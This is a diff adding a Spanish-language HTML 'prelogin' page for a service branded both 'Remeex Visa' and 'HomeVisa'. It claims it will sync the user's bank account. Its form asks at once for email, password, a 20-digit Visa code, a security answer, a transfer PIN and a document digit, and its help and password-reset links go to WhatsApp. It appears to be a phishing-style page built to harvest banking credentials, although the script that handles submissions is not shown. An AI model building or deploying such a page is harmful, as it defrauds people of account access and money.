@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Remeex Visa · Prelogin Seguro</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      color-scheme: dark light;
+      --bg: #0f172a;
+      --card: rgba(15, 23, 42, 0.72);
+      --card-border: rgba(148, 163, 184, 0.25);
+      --text: #e2e8f0;
+      --muted: #94a3b8;
+      --primary: #38bdf8;
+      --primary-strong: #0ea5e9;
+      --danger: #f87171;
+      --success: #4ade80;
+      --surface: rgba(15, 23, 42, 0.55);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: radial-gradient(circle at top, #1e293b, #020617 60%);
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: clamp(1.5rem, 3vw, 3rem);
+    }
+
+    .prelogin-card {
+      width: min(960px, 100%);
+      background: var(--card);
+      border-radius: 24px;
+      border: 1px solid var(--card-border);
+      box-shadow: 0 40px 90px rgba(15, 23, 42, 0.45);
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      overflow: hidden;
+    }
+
+    .hero-panel {
+      position: relative;
+      padding: clamp(1.75rem, 2.75vw, 2.5rem);
+      background: linear-gradient(160deg, rgba(56, 189, 248, 0.25), rgba(14, 165, 233, 0.18));
+    }
+
+    .hero-panel::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at top right, rgba(14, 165, 233, 0.28), transparent 55%);
+      pointer-events: none;
+    }
+
+    .hero-panel h1 {
+      margin: 0;
+      font-size: clamp(1.8rem, 3vw, 2.8rem);
+      font-weight: 700;
+      letter-spacing: -0.02em;
+    }
+
+    .hero-panel p {
+      margin-top: 1rem;
+      margin-bottom: clamp(1.5rem, 2vw, 2.5rem);
+      color: var(--muted);
+      max-width: 28rem;
+      line-height: 1.6;
+      font-size: 0.98rem;
+    }
+
+    .status-indicator {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.4rem 0.85rem;
+      border-radius: 999px;
+      background: rgba(14, 165, 233, 0.12);
+      color: var(--primary);
+      font-weight: 600;
+      font-size: 0.85rem;
+    }
+
+    .status-indicator span {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--success);
+      box-shadow: 0 0 0 6px rgba(74, 222, 128, 0.18);
+      display: inline-block;
+    }
+
+    .form-panel {
+      padding: clamp(1.75rem, 3vw, 2.75rem);
+      background: rgba(15, 23, 42, 0.65);
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+
+    .form-panel header {
+      display: flex;
+      flex-direction: column;
+      gap: 0.35rem;
+    }
+
+    .form-panel h2 {
+      margin: 0;
+      font-size: clamp(1.35rem, 2.5vw, 1.8rem);
+      font-weight: 600;
+      letter-spacing: -0.01em;
+    }
+
+    .form-panel header p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 0.9rem;
+    }
+
+    form {
+      display: grid;
+      gap: 1rem;
+    }
+
+    .form-row {
+      display: grid;
+      gap: 0.75rem;
+    }
+
+    label {
+      display: flex;
+      flex-direction: column;
+      gap: 0.45rem;
+      font-weight: 600;
+      font-size: 0.92rem;
+    }
+
+    label span {
+      color: var(--muted);
+      font-weight: 500;
+      font-size: 0.8rem;
+      letter-spacing: 0.02em;
+      text-transform: uppercase;
+    }
+
+    input, select {
+      appearance: none;
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border-radius: 14px;
+      border: 1px solid rgba(148, 163, 184, 0.35);
+      background: rgba(15, 23, 42, 0.55);
+      color: var(--text);
+      font-size: 0.95rem;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    input:focus, select:focus {
+      border-color: rgba(56, 189, 248, 0.6);
+      box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.18);
+      outline: none;
+    }
+
+    .dual-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 0.75rem;
+    }
+
+    .security-question {
+      background: rgba(148, 163, 184, 0.08);
+      border-radius: 12px;
+      padding: 0.85rem 1rem;
+      border: 1px dashed rgba(148, 163, 184, 0.35);
+      color: var(--muted);
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+
+    .actions {
+      display: grid;
+      gap: 0.75rem;
+    }
+
+    button[type="submit"] {
+      padding: 0.85rem 1rem;
+      border-radius: 14px;
+      border: none;
+      background: linear-gradient(135deg, var(--primary), var(--primary-strong));
+      color: white;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    button[type="submit"]:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 14px 35px rgba(14, 165, 233, 0.25);
+    }
+
+    button[type="submit"]:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+    }
+
+    .secondary-actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.75rem;
+      justify-content: space-between;
+      font-size: 0.88rem;
+    }
+
+    .secondary-actions a {
+      color: var(--primary);
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .secondary-actions a:hover,
+    .secondary-actions a:focus {
+      text-decoration: underline;
+    }
+
+    .alert {
+      border-radius: 14px;
+      padding: 0.9rem 1rem;
+      font-size: 0.9rem;
+      line-height: 1.5;
+      display: none;
+    }
+
+    .alert.is-visible {
+      display: block;
+    }
+
+    .alert-error {
+      background: rgba(248, 113, 113, 0.12);
+      border: 1px solid rgba(248, 113, 113, 0.35);
+      color: #fecaca;
+    }
+
+    .alert-success {
+      background: rgba(74, 222, 128, 0.12);
+      border: 1px solid rgba(74, 222, 128, 0.35);
+      color: #bbf7d0;
+    }
+
+    .session-preview {
+      margin-top: auto;
+      display: grid;
+      gap: 0.65rem;
+      padding: 1rem;
+      border-radius: 16px;
+      border: 1px dashed rgba(148, 163, 184, 0.25);
+      background: rgba(15, 23, 42, 0.45);
+      font-size: 0.85rem;
+      color: var(--muted);
+    }
+
+    .session-preview strong {
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    .whatsapp-card {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.65rem;
+      padding: 0.65rem 0.85rem;
+      border-radius: 12px;
+      background: rgba(34, 197, 94, 0.12);
+      border: 1px solid rgba(34, 197, 94, 0.25);
+      color: #bbf7d0;
+      text-decoration: none;
+      font-weight: 600;
+      width: fit-content;
+    }
+
+    .whatsapp-card svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+
+    .loading {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.45rem;
+      font-size: 0.85rem;
+      color: var(--muted);
+    }
+
+    .loading span {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      border: 2px solid rgba(148, 163, 184, 0.4);
+      border-top-color: var(--primary);
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @media (max-width: 860px) {
+      .prelogin-card {
+        grid-template-columns: 1fr;
+      }
+
+      .hero-panel {
+        position: relative;
+        min-height: 260px;
+      }
+
+      .session-preview {
+        order: 3;
+      }
+    }
+  </style>
+</head>
+<body>
+  <article class="prelogin-card">
+    <section class="hero-panel">
+      <div class="status-indicator" id="supabase-status">
+        <span></span>
+        Supabase conectado
+      </div>
+      <h1>Acceso seguro a tu HomeVisa</h1>
+      <p>
+        Recupera tu sesión oficial desde la nube para continuar usando HomeVisa en este dispositivo.
+        Verificaremos tus credenciales bancarias y sincronizaremos tus saldos, movimientos e historial de verificación en pocos segundos.
+      </p>
+      <a class="whatsapp-card" href="https://wa.me/17373018059?text=Necesito%20ayuda%20para%20iniciar%20sesión%20en%20HomeVisa" target="_blank" rel="noopener">
+        <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M12 2a10 10 0 0 0-8.84 14.88L2 22l5.24-1.13A10 10 0 1 0 12 2Zm0 1.8A8.2 8.2 0 0 1 19.76 12 8.16 8.16 0 0 1 7.56 18.81l-.25.15-3 .64.64-2.94-.16-.3A8.2 8.2 0 0 1 12 3.8Zm4.31 9c-.24-.12-1.42-.7-1.64-.78s-.38-.12-.54.12-.62.78-.76.94-.28.18-.52.06a6.7 6.7 0 0 1-3.27-2.86c-.24-.42.24-.4.66-1.33.08-.18 0-.34-.06-.46s-.54-1.3-.74-1.78-.4-.4-.54-.4h-.42a.8.8 0 0 0-.58.28 2.41 2.41 0 0 0-.76 1.78 4.17 4.17 0 0 0 .86 2.2A9.59 9.59 0 0 0 13 14.64a3.37 3.37 0 0 0 1.95.4 1.7 1.7 0 0 0 1.14-.76 1.38 1.38 0 0 0 .1-.78c-.1-.18-.24-.24-.48-.36Z" />
+        </svg>
+        Chat de ayuda inmediato
+      </a>
+      <div class="session-preview" id="session-preview" hidden>
+        <div><strong>Usuario:</strong> <span id="preview-name">—</span></div>
+        <div><strong>Correo:</strong> <span id="preview-email">—</span></div>
+        <div><strong>Estado:</strong> <span id="preview-status">—</span></div>
+      </div>
+    </section>
+
+    <section class="form-panel">
+      <header>
+        <h2>Verifica tu identidad</h2>
+        <p>Introduce los mismos datos que usaste durante tu registro digital.</p>
+      </header>
+
+      <div class="alert alert-error" id="prelogin-error" role="alert"></div>
+      <div class="alert alert-success" id="prelogin-success" role="status"></div>
+
+      <form id="prelogin-form" novalidate>
+        <div class="form-row">
+          <label>
+            Correo electrónico
+            <span>Identificador principal</span>
+            <input type="email" id="email" autocomplete="email" required placeholder="ejemplo@correo.com">
+          </label>
+          <div class="loading" id="profile-loading" hidden>
+            <span></span>
+            Buscando información en Supabase…
+          </div>
+        </div>
+
+        <div class="dual-grid">
+          <label>
+            Contraseña
+            <span>Igual a la del registro</span>
+            <input type="password" id="password" autocomplete="current-password" required placeholder="Tu contraseña">
+          </label>
+          <label>
+            Código Visa de 20 dígitos
+            <span>Enviado al correo</span>
+            <input type="password" id="security-code" inputmode="numeric" pattern="[0-9]{20}" minlength="20" maxlength="20" required placeholder="0000 0000 0000 0000 00">
+          </label>
+        </div>
+
+        <div class="form-row">
+          <div class="security-question" id="security-question">Introduce tu correo para ver tu pregunta de seguridad.</div>
+          <label>
+            Respuesta de seguridad
+            <span>Debe coincidir al 100%</span>
+            <input type="text" id="security-answer" autocomplete="off" required placeholder="Respuesta exacta registrada">
+          </label>
+        </div>
+
+        <div class="dual-grid">
+          <label>
+            PIN de seguridad (4 dígitos)
+            <span>Usado para validar transferencias</span>
+            <input type="password" id="security-pin" inputmode="numeric" pattern="[0-9]{4}" minlength="4" maxlength="4" required placeholder="••••">
+          </label>
+          <label>
+            Validación extra
+            <span>Último dígito de tu documento</span>
+            <input type="text" id="document-check" maxlength="1" autocomplete="off" placeholder="Ej: 5">
+          </label>
+        </div>
+
+        <div class="actions">
+          <button type="submit" id="submit-btn">Sincronizar cuenta</button>
+        </div>
+      </form>
+
+      <div class="secondary-actions">
+        <a href="https://wa.me/17373018059?text=Olvidé%20mi%20contraseña%20de%20HomeVisa" target="_blank" rel="noopener">¿Olvidaste tu contraseña?</a>
+        <a href="miinformacion.html" target="_blank" rel="noopener">Ver mis datos sincronizados</a>
+        <a href="homevisa.html">Entrar a HomeVisa</a>
+      </div>
+    </section>
+  </article>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script src="js/supabase-client-frontend.js"></script>
+  <script src="js/homevisa-prelogin.js" defer></script>
+</body>
+</html>
